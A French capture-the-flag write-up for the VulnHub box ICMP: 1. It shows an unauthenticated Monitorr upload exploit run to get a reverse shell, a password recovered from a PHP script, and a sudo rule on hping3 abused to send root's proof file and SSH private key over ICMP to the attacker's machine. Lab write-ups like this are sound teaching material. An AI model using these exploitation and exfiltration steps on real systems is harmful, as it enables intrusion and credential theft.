# Solution du CTF ICMP de VulnHub

Proposé par foxlox, [ICMP: 1](https://vulnhub.com/entry/icmp-1,633/) est une box affichée comme facile. D'autant plus si on a de bonnes connaissances en réseau :)

```
Nmap scan report for 192.168.56.44
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 deb52389bb9fd41ab50453d0b75cb03f (RSA)
|   256 160914eab9fa17e945395e3bb4fd110a (ECDSA)
|_  256 9f665e71b9125ded705a4f5a8d0d65d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-title:             Monitorr            | Monitorr        
|_Requested resource was http://192.168.56.44/mon/
|_http-server-header: Apache/2.4.38 (Debian)
```

On a une appli web avec une signature qui donne son nom ainsi que son numro de version : Monitorr 1.7.6m, la release date de juillet 2018 ([Release Master: 1.7.6m · Monitorr/Monitorr · GitHub](https://github.com/Monitorr/Monitorr/releases/tag/1.7.6m))

Une recherche sur exploit-db remonte deux exploits :

* [Monitorr 1.7.6m - Authorization Bypass - PHP webapps Exploit](https://www.exploit-db.com/exploits/48981)

* [Monitorr 1.7.6m - Remote Code Execution (Unauthenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/48980)

L'une est un bypass d'autorisation et l'autre une RCE... sans authentification. Bref on peut directement zapper la première.

L'exploit en question se sert d'une faille de type unresitricted upload (à peu de choses près car il fake le content-type et intègre un entête d'image mais *Monitorr* laisse passer l'extension en PHP). Le code uploadé exécute une commande bash de reverse shell, il faut donc mettre un ncat en écoute avant exécution :

```shellsession
$ python3 monitorr.py http://192.168.56.44/mon 192.168.56.1 9999
A shell script should be uploaded. Now we try to execute it
```

Et voilà :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.44.
Ncat: Connection from 192.168.56.44:48580.
bash: cannot set terminal process group (455): Inappropriate ioctl for device
bash: no job control in this shell
www-data@icmp:/var/www/html/mon/assets/data/usrimg$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Sur le système je remarque un utilisateur nommé *fox* :

`uid=1000(fox) gid=1000(fox) groups=1000(fox)`

```shellsession
www-data@icmp:/home/fox$ ls -al
total 20
drwxr-xr-x 3 root root 4096 Dec  3  2020 .
drwxr-xr-x 3 root root 4096 Dec  3  2020 ..
lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
drwx--x--x 2 fox  fox  4096 Dec  3  2020 devel
-rw-r--r-- 1 fox  fox    33 Dec  3  2020 local.txt
-rw-r--r-- 1 root root   78 Dec  3  2020 reminder
www-data@icmp:/home/fox$ cat local.txt
c9db6c88939a2ae091c431a45fb1e59c
www-data@icmp:/home/fox$ cat reminder
crypt with crypt.php: done, it works
work on decrypt with crypt.php: howto?!?
```

Le script *crypt.php* se trouve dans le dossier *devel*. On ne peut pas lister le dossier mais passer à travers (droit exécution). Ca semblait évident :)

```php
<?php
echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
?>
```

Si on exécute le script avec l'interpréteur PHP ça nous donne `daBzh0EX1iJIU`.

Mais c'est bien `BUHNIJMONIBUVCYTTYVGBUHJNI`  qui est accepté comme mot de passe pour l'utilisateur *fox*.

On peut directement se connecter via SSH avec cet utilisateur et constater qu'il peut exécuter deux commandes en tant que root :

```bash
User fox may run the following commands on icmp:
    (root) /usr/sbin/hping3 --icmp *
    (root) /usr/bin/killall hping3
```

`hping3` ne dispose pas d'option permettant d'exécuter du code mais des options permettent de spécifier la charge à injecter dans le paquet réseau.

On va donc s'envoyer le flag final :

```shellsession
$ ls -al /root
total 36
drwxr-xr-x  3 root root 4096 Dec  3  2020 .
drwxr-xr-x 18 root root 4096 Dec  3  2020 ..
lrwxrwxrwx  1 root root    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   84 Nov  4  2020 .google_authenticator
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Dec  3  2020 proof.txt
drwxr-xr-x  2 root root 4096 Nov  4  2020 .ssh
-rw-------  1 root root  937 Dec  3  2020 .viminfo
-rw-r--r--  1 root root  209 Dec  3  2020 .wget-hsts
$ sudo /usr/sbin/hping3 --icmp --file /root/proof.txt -d 33 192.168.56.1
HPING 192.168.56.1 (enp0s3 192.168.56.1): icmp mode set, 28 headers + 33 data bytes
[main] memlockall(): Operation not supported
Warning: can't disable memory paging!
len=61 ip=192.168.56.1 ttl=64 id=185 icmp_seq=0 rtt=8.3 ms
```

On aura bien sûr mis un tshark à l'écoute :

```shellsession
$ sudo tshark -x -i vboxnet0 icmp
Running as user "root" and group "root". This could be dangerous.
Capturing on 'vboxnet0'
 ** (tshark:15465) 21:43:04.226969 [Main MESSAGE] -- Capture started.
 ** (tshark:15465) 21:43:04.227064 [Main MESSAGE] -- File: "/tmp/wireshark_vboxnet0QMF5U1.pcapng"
0000  0a 00 27 00 00 00 08 00 27 bb c6 71 08 00 45 00   ..'.....'..q..E.
0010  00 3d 65 ac 00 00 40 01 23 96 c0 a8 38 2c c0 a8   .=e...@.#...8,..
0020  38 01 08 00 04 00 6f 03 00 00 39 33 37 37 65 37   8.....o...9377e7
0030  37 33 38 34 36 61 65 61 62 62 35 31 62 33 37 31   73846aeabb51b371
0040  35 35 65 31 35 63 66 36 33 38 0a                  55e15cf638.
```

On peut aussi ne récupérer que le texte via la commande :

```bash
sudo tshark -w- -i vboxnet0 icmp
```

On peut modifier la commande hping pour envoyer la clé privée SSH de l'utilisateur root. Il faut la recoller car elle parvient en deux paquets mais c'est suffisant pour avoir un shell.

```shellsession
$ ssh -i root.key root@192.168.56.44
Linux icmp 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@icmp:~# cat proof.txt 
9377e773846aeabb51b37155e15cf638
```

Ce fut rapide mais pas inintéressant :)

*Publié le 4 novembre 2022*
